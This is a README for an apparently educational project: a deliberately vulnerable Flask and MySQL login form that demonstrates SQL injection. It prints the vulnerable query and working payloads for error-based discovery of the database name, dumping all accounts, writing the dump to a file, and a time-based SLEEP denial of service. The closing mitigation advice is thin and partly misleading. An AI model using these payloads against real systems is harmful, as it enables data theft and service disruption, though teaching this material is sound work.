# SQL Injection Projcet
## Overview
This project demonstrates the vulnerabilities of invalid usage of SQL parameters.
This is a simple login form written in flask with mysql database.
## Prerequisites
In order to run this code you'll need:
* python 3.8 installed.
* mysql database (you can use mysql docker image).
* (optional) postman installed, to inspect the responses.
## Getting started
First you'll need to run the mysql database:
### With docker
You can run mysql with the `Dockerfile` in this repo:
``` bash
docker build -t db .
docker run db
```
this will create a database named `bank`, a table called `account` and insert dummy data (users) into it.
### Run the backend
Before runnig the backend execute:
``` bash
python -m pip install -r requirements.txt
```
The backend is written with flask. In order to run the backend execute:
``` bash
export FLASK_APP=app.py
python -m flask run
```
## Execute injections
The vulnerability of this web app is in the username field:
``` SQL
"SELECT * FROM account WHERE userid='%s'" % user_id
```
### Get the database's name
Before executing the queries we need to determine the db name, we can do this using and error based injection:

In the username field enter:
``` SQL
test'; SELECT a(); #
```
1. The first part is the original query:
    ``` SQL
    SELECT * FROM account WHERE userid='test'
    ```
2. The second part is the injection, this will cause an error.
3. Third part will nullify the rest of the origial quary.
The result of the above quary will be:
```
FUNCTION bank.a does not exist
```
We now know that the database the users are kept in is called `bank`
### Get all users
In order to get all the users in the `account` table enter:
``` SQL
test' or 1=1; #
```
Again, the second part is the injection cause it's always true. The result will be:
``` 
[('Yakuza', 'aa', 'aa', 54725, 'yakuzarockz@japan.com', 9843059),
 ('Bogambo Vila', 'bagambo', 'bogambo', 24350, 'bogambo@paki.com', 4643614),
 ('Heth Ledger', 'heth1', 'heth1', 20000, 'heth@gotham.com', 6434614)]
```
### Write users list to file
``` SQL
test' or 1=1 INTO dumpfile '/tmp/users'; #
```
This will write the users list to a file.

### Denial of service
We can prevent the application from processing requests:
``` sql
test'; SELECT IF(SUBSTRING(version(),1,1)=8,SLEEP(50),null); #
```
If the database's major version is 8 the database wil sleep for 50 seconds.
This is called blind sql injection because we dont need to know the internal database structure.

## Protect againts SQL injection
In order to protect from sql injection the developer need to pay close attentions when using parameters in an sql query.
Some precations that can be applied:

1. Allow the execution of only one query.
2. Always user sql parameters as string

Here I'm using `mysql-connector-python` package, it will only allow the execution of one query unless stated otherwise in the code.
Using `SQLAlchemy` pypi will take care of most of the sql vulnerabilities.